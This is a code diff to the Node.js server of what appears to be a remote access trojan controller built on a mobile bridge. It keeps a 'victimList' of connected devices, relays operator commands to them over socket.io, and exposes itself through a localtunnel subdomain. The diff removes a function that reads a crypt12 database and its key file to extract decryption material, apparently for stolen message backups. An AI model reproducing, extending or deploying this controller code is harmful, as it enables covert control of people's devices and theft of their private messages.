@@ -17,11 +17,15 @@ const port = 8080;
 const startListener=(subdomain)=>{
 server.listen(port, (err) => {
     if (err) return;
+    if(subdomain){
     (async () => {
       tunnel = await localtunnel({ port: 8080, subdomain });
       rn_bridge.channel.post('listnerStarted');
       log("URL =>  " + tunnel.url);
       })();
+    }else{
+      rn_bridge.channel.post('listnerStarted');
+    }
 });
 io.on('connection', (socket) => {
     socket.on('join',(device)=>{
@@ -151,17 +155,6 @@ const send =(d)=>{
   io.to(victimList[to]).emit(action, data);
 }
 
-const decrypt =(d)=>{
-  log(JSON.parse(d));
-  let { databaseFilename, keyFilename,} = JSON.parse(d);
-  var crypt12 = fs.readFileSync(databaseFilename);
-  var keyfile = fs.readFileSync(keyFilename);
-  var iv = crypt12.slice(67, 83);
-  var key = keyfile.slice(126, 158);
-  var crypted = crypt12.slice(190, crypt12.length);
-
-}
-
 const stopListener =()=>{
   server.close();
   tunnel.close();
@@ -179,14 +172,6 @@ rn_bridge.channel.on('startListener', (arg) => {
 rn_bridge.channel.on('cmd', (data) => {
   try {
     send(data)
-  } catch (err) {
-    log("Error: " + JSON.stringify(err) + " => " + err.stack );
-  }
-});
-
-rn_bridge.channel.on('decrypt', (data) => {
-  try {
-    decrypt(data)
   } catch (err) {
     log("Error: " + JSON.stringify(err) + " => " + err.stack );
   }
